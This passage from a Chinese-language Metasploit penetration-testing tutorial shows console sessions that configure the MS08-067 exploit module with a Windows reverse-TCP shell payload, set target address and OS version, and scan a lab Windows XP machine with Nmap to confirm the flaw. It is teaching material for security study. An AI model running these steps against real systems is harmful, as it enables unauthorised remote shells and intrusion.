### 优化后的文本

#### (ms08_067_netapi) 提示符下，执行 `show payloads` 命令仅会显示以下输出结果。

在前面的例子中，我们使用 `search` 命令找到了 MS08-067 攻击模块。现在，我们将使用 `show payloads` 命令查找适合该攻击模块的攻击载荷。请注意，在本例中，只有针对 Windows 平台的攻击载荷才会被显示出来。Metasploit 通常会根据环境识别出可在特定渗透攻击中使用的攻击载荷。

```plaintext
msf exploit(ms08_067_netapi)> show payloads
Compatible Payloads
===================
Name                                      Rank    Description
--------------------------------------------------------------
windows/shell/reverse_ipv6_tcp            normal  Windows Command Shell, Reverse TCP Stager (IPv6)
windows/shell/reverse_nonx_tcp            normal  Windows Command Shell, Reverse TCP Stager (No NX or Win7)
windows/shell/reverse_ord_tcp             normal  Windows Command Shell, Reverse Ordinal TCP Stager (No NX or Win7)
windows/shell/reverse_tcp                 normal  Windows Command Shell, Reverse TCP Stager
windows/shell/reverse_tcp_allports        normal  Windows Command Shell, Reverse All-Port TCP Stager
windows/shell_bind_tcp                    normal  Windows Command Shell, Bind TCP Inline
windows/shell_reverse_tcp                 normal  Windows Command Shell, Reverse TCP Inline
```

接下来，我们输入 `set payload windows/shell/reverse_tcp` 以选择 `reverse_tcp`（反弹式 TCP 连接）攻击载荷。然后，通过 `show options` 命令查看额外的参数配置：

```plaintext
payload => windows/shell/reverse_tcp
msf exploit(ms08_067_netapi)> show options
Module options:
Name     Current Setting  Required  Description
----     ---------------  --------  -----------
RHOST                     yes       The target address
RPORT    445              yes       Set the SMB service port
SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Payload options (windows/shell/reverse_tcp):
Name     Current Setting  Required  Description
----     ---------------  --------  -----------
EXITFUNC thread           yes       Exit technique: seh, thread, process
LHOST                      yes       The local address
LPORT    4444             yes       The local port
```

可以看到，在标记为①处我们选定了攻击载荷，在②处我们显示了该模块的参数配置，而在③处则展示了额外的攻击载荷配置项，如 `LHOST` 和 `LPORT` 等。在这个例子中，你可以配置目标主机回连到攻击机的特定 IP 地址和端口号上，因此它被称为一个反弹式的攻击载荷。在反弹式攻击载荷中，连接由目标主机发起，并且其连接对象是攻击机。这种技术可以穿透防火墙或 NAT 网关。

随后，我们将对这个攻击载荷的 `LHOST`（本地主机）和 `RHOST`（远程主机）进行设置，将 `LHOST` 设置为我们的攻击机的 IP 地址，而远程主机将反向连接到攻击机默认的 TCP 端口（4444）上。

### 5.1.5 显示目标系统

Metasploit 的渗透攻击模块通常可以列出受到漏洞影响的目标系统的类型。例如，由于针对 MS08-067 漏洞的攻击依赖于硬编码的内存地址，所以这个攻击仅针对特定的操作系统版本，并且只适用于特定的补丁级别、语言版本以及安全机制实现（详情请参见第14章和第15章）。在 MSF 终端 MS08-067 的提示符状态下，会显示60个受影响的系统（下面仅截取部分）。攻击是否成功取决于目标 Windows 系统的版本，有时自动选择目标的功能可能无法正常工作，容易触发错误攻击行为，导致远程服务崩溃。

```plaintext
msf exploit(ms08_067_netapi)> show targets
Exploit targets:
Id  Name
--  ----
0   Automatic Targeting
1   Windows 2000 Universal
2   Windows XP SP0/SP1 Universal
3   Windows XP SP2 English (NX)
4   Windows XP SP3 English (NX)
5   Windows 2003 SP0 Universal
6   Windows 2003 SP1 English (NO NX)
7   Windows 2003 SP1 English (NX)
8   Windows 2003 SP2 English (NO NX)
9   Windows 2003 SP2 English (NX)
```

在这个例子中，你看到“自动选择目标”（Auto Targeting）是攻击目标列表中的一个选项。通常，攻击模块会通过目标操作系统的指纹信息自动选择操作系统版本进行攻击。不过，最好还是通过人工更加准确地识别出目标操作系统的相关信息，这样才能避免触发错误的、破坏性的攻击。

**提示**：本例中介绍的这个攻击模块有些“喜怒无常”，很容易造成被攻击的系统变得不稳定，而且它很难对操作系统自动做出准确的判定。如果你在测试用的虚拟机（Windows XP SP2）上使用这个攻击模块，一定要手动设置好目标操作系统的类型。

### 5.1.6 获取详细信息

当你觉得 `show` 和 `search` 命令所提供的信息过于简短时，可以使用 `info` 命令加上模块的名字来显示此模块的详细信息、参数说明以及所有可用的目标操作系统。如果已选择了某个模块，直接在该模块的提示符下输入 `info` 即可。

```plaintext
msf exploit(ms08_067_netapi)> info
```

### 5.1.7 设置和取消设置

Metasploit 模块中的所有参数只有两个状态：已设置（set）或未设置（unset）。有些参数会被标记为必填项（required），这样的参数必须经过手工设置并处于启用状态。输入 `show options` 命令可以查看哪些参数是必填的；使用 `set` 命令可以对某个参数进行设置（同时启用该参数）；使用 `unset` 命令可以禁用相关参数。后面的列表展示了 `set` 和 `unset` 命令的使用方法：

**提示**：在我们的例子中，所有引用的变量名称都使用了大写字母，这并不是必需的，但这样做确实是一个好习惯。

```plaintext
msf exploit(ms08_067_netapi)> set RHOST 192.168.1.155
RHOST => 192.168.1.155
msf exploit(ms08_067_netapi)> set TARGET 3
TARGET => 3
msf exploit(ms08_067_netapi)> show options
Module options:
Name     Current Setting  Required  Description
----     ---------------  --------  -----------
RHOST    192.168.1.155   yes       The target address
RPORT    445              yes       Set the SMB service port
SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Exploit target:
Id  Name
--  ----
3   Windows XP SP2 English (NX)
msf exploit(ms08_067_netapi)> unset RHOST
Unsetting RHOST...
```

在①处，我们设置目标 IP 地址（`RHOST`）为 `192.168.1.155`（我们的攻击对象）。在②处，我们设置目标操作系统版本为“Windows XP SP2 English (NX)”。在③处，我们运行了 `show options` 以确认所有的参数已设置完成。

### 5.1.8 设置和取消设置全局参数

`setg` 命令和 `unsetg` 命令能够对全局参数进行设置或清除。使用这组命令让你不必每次遇到某个参数都要重新设置，特别是那些经常用到又很少会变的参数，如 `LHOST`。

### 5.1.9 保存配置

在使用 `setg` 命令对全局参数进行设置后，可以使用 `save` 命令将当前的设置值保存下来，这样在下次启动 MSF 终端时还可使用这些设置值。在 Metasploit 中可以在任何时候输入 `save` 命令以保存当前状态。

```plaintext
msf exploit(ms08_067_netapi)> save
Saved configuration to: /root/.msf3/config
msf exploit(ms08_067_netapi)>
```

在命令执行结果中包含设置值保存在磁盘上的位置（`/root/.msf3/config`），如果由于一些原因你需要恢复到原始设置，可以将这个文件删除或移动到其他位置。

### 5.2 你的第一次渗透攻击

理论联系实际才是最好的学习方法。我们已经了解了渗透攻击的基础知识，也知道了如何在 BackTrack 攻击机环境中使用 Metasploit。

如果在第4章中你跟我们一起使用漏洞扫描器对这台 Windows XP SP2 虚拟机进行了扫描，那么现在我们可以看看漏洞扫描器是如何通过手工方法发现这个漏洞的。

随着你的渗透测试技能不断提高，发现一些特定的开放端口后，你能够不加思索地联想到如何利用相应的服务漏洞展开攻击。手工进行漏洞检查的最佳途径之一是在 Metasploit 中使用 Nmap 的扫描脚本，如下所示：

```bash
root@bt:/root# cd /opt/framework3/msf3/
root@bt:/opt/framework3/msf3# msfconsole
...SNIP...
msf> nmap -sT -A --script=smb-check-vulns -Pn 192.168.33.130
Warning: Traceroute does not support idle or connect scan, disabling..
NSE: Script Scanning completed.
Nmap scan report for 192.168.33.130
Host is up (0.00050s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
25/tcp    open  smtp          Microsoft ESMTP 6.0.2600.2180
80/tcp    open  http          Microsoft IIS webserver 5.1
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn
443/tcp   open  https?
445/tcp   open  microsoft-ds  Microsoft Windows XP microsoft-ds
1025/tcp  open  msrpc         Microsoft Windows RPC
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2005 9.00.1399; RTM
MAC Address: 00:0C:29:EA:26:7C (VMware)
Device type: general purpose
Running: Microsoft Windows XP|2003
OS details: Microsoft Windows XP Professional SP2 or Windows Server 2003
Network Distance: 1 hop
Service Info: Host: ihazsecurity; OS: Windows
Host script results:
| smb-check-vulns:
|   MS08-067: VULNERABLE
|   Conficker: Likely CLEAN
|   SMBv2 DoS (CVE-2009-3103): CHECK DISABLED (add '--script-args=unsafe=1' to run)
|_  OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 71.67 seconds
msf>
```

我们从 Metasploit 中调用了 Nmap 的插件 `--script=smb-check-vulns`。留意一下我们在执行 Nmap 扫描时使用的参数：`-sT` 是指隐秘的 TCP 连接扫描（Stealth TCP Connect），我们在实践中发现使用这个参数进行端口枚举是最可靠的。（其他推荐的参数还有 `-sS`：隐秘的 TCP SYN 扫描。）`-A` 是指高级操作系统探测功能（Advanced OS Detection），它会对一个特定服务进行更深入的旗标和指纹搜取，能够为我们提供更多信息。

注意在 Nmap 的扫描结果③处报告发现了 MS08-067：VULNERABLE。这暗示我们或许能够对这台主机进行攻击。下面让我们在 Metasploit 中找到可用于此漏洞的攻击模块，并尝试攻入这台主机。

攻击是否成功取决于目标主机的操作系统版本、安装的服务包（Service Pack）版本以及语言类型，同时还依赖于是否成功绕过了数据执行保护（DEP：Data Execution Prevention）。DEP 是为了防御缓冲区溢出攻击而设计的，它将程序堆栈渲染为只读，以防止 shellcode 被恶意放置在堆栈区并执行。但是，我们可以通过一些复杂的堆栈操作来绕过 DEP 保护。（如何绕过 DEP 的更多技术细节可以查阅 [http://www.uninformed.org/?v=2&a=4](http://www.uninformed.org/?v=2&a=4)）

在上一小节中，我们运行 `show targets` 命令列出了这个特定漏洞渗透攻击模块所有可用的目标操作系统版本。由于 MS08-067 是一个对操作系统版本依赖程度非常高的漏洞，所以在这里，我们手动指定目标版本以确保触发正确的溢出代码。基于上面 Nmap 的扫描结果，我们可以判定③目标操作系统为 Windows XP Service Pack 2。（从结果中看也可能是 Windows Server 2003）